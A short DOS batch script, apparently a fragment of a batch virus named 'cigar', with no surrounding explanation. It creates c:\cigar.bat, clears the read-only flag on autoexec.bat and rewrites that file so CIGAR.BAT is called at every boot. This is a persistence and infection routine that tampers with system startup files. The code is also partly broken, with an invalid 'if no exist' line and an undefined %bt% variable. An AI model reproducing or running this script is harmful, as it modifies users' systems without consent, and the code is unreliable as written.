@echo off
if no exist c:\cigar.bat goto cigar
for %%i in (*.bat) do set cigar=%%i
for %%o in (%bt%) do if "%cigar%"=="AUTOEXEC.BAT" goto mod
goto n
:cigar
echo @echo off >> c:\cigar.bat
:mod
rem ------ Modul 1 -------
attrib autoexec.bat -r
copy autoexec.bat autoexec.olf
echo @if exist CIGAR.BAT call CIGAR.BAT > autoexec.bat
type autoexec.olf >> autoexec.bat
del autoexec.olf
:n

